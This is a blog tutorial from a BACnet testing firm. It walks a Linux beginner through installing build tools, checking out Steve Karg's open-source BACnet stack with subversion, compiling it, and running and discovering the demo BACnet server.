If you have googled for “free bacnet source code” and found Steve Karg’s 5-star BACnet project on sourceforge.net, congratulations. If not, welcome, you are in for an illuminating introduction to the project.

This article describes in very simple steps how to prepare a standard linux system and compile and test the BACnet Server demo that is included in Steve’s stack (let’s just call it “The Stack” from now on).

The examples provided work on Ubuntu, as well as the “Windows Linux Subsystem” provided by Microsoft (!) with Windows 10. Furthermore I am going to assume that you have minimal linux experience and so I will start describing the required steps from scratch. So without further ado, here goes:

Make sure you have the necessary linux tools. To do so, install the gcc compiler as well as subversion source code version control system.

`sudo apt-get install -y build-essential`

(“sudo” for those not in the know, allows elevated permissions that are required to install new tools in linux, you will have to provide a password to authenticate the first time you run this).

[![](https://www.bac-test.com/wp-content/uploads/2018/06/build-essential.png)](https://www.bac-test.com/wp-content/uploads/2018/06/build-essential.png)

`sudo apt-get install subversion`

[![](https://www.bac-test.com/wp-content/uploads/2018/06/install-subversion.png)](https://www.bac-test.com/wp-content/uploads/2018/06/install-subversion.png)

Now that the minimal toolset is installed, obtain the source code, using subversion, directly from the repository on sourceforge. Running the following command line will actually pick a subset of the stack from the full repo, but rest assured it is a very useful subset. The source tree will be installed into a subdirecory that is named by the final parameter on the command line, in this case “bacdemo”

`svn checkout svn://svn.code.sf.net/p/bacnet/code/trunk/bacnet-stack bacdemo`

The screenshot below shows the final result of the quite lengthly download of the source tree.

[![](https://www.bac-test.com/wp-content/uploads/2018/06/subversion.png)](https://www.bac-test.com/wp-content/uploads/2018/06/subversion.png)

Then, the stack has to be built.

`cd bacdemo`

`make`

The resulting compile will create many examples of bacnet tools and utilities, for example, BACnet clients such as “readproperty”. These will be discussed fully in a later article. Once again, just the trailing screenshot of the result..

[![](https://www.bac-test.com/wp-content/uploads/2018/06/make-1.png)](https://www.bac-test.com/wp-content/uploads/2018/06/make-1.png)

Now, remember, out of the multitude of compiled executable programs, we are interested in the BACnet Server demo program. This can be run by simply typing:

`demo/server/bacserv`

Believe it or not, that results in a running BACnet server on your PC. There are a few issues that we will cover in another article regarding IP configuration parameters, but for now, the following screenshot shows the running server

[![](https://www.bac-test.com/wp-content/uploads/2018/06/run.png)](https://www.bac-test.com/wp-content/uploads/2018/06/run.png)

And to confirm that this is running as expected, we need to go to a BACnet Client ON ANOTHER COMPUTER and run one of the available BACnet Client tools and discover this BACnet Server. The example below shows  our BACnet Test Client displaying the discovered BACnet Server and BACnet Objects in that BACnet Server. This tool can be obtained from <https://www.bac-test.com/bacnet-test-client-download/>

[![](https://www.bac-test.com/wp-content/uploads/2018/06/browse.png)](https://www.bac-test.com/wp-content/uploads/2018/06/browse.png)If

That is it !  If you have any questions, please feel free to contact me at info@bac-test.com

Ed

How to build a FOSS BACnet Server based on Steve Karg’s SourceForge project
[BACnetEd](https://www.bac-test.com/author/admin/)
[June 3, 2018June 10, 2018](https://www.bac-test.com/how-to-build-a-foss-bacnet-server-based-on-steve-kargs-sourceforge-project/ "6:20 pm") [BACnet Stack Tutorials](https://www.bac-test.com/category/bacnet-stack-tutorials/)

* [“Firmware is the most expensive thing in the universe.” →](https://www.bac-test.com/firmware-is-the-most-expensive-thing-in-the-universe/)

### Archives

* [July 2021](https://www.bac-test.com/2021/07/)
* [January 2019](https://www.bac-test.com/2019/01/)
* [June 2018](https://www.bac-test.com/2018/06/)

### Meta

* [Log in](https://www.bac-test.com/wp-login.php)

Copyright © 2025 [BACnet Interoperability Testing Services, Inc](https://www.bac-test.com/ "BACnet Interoperability Testing Services, Inc"). All rights reserved. Theme [Spacious](https://themegrill.com/themes/spacious "Spacious") by ThemeGrill. Powered by: [WordPress](https://wordpress.org "WordPress").


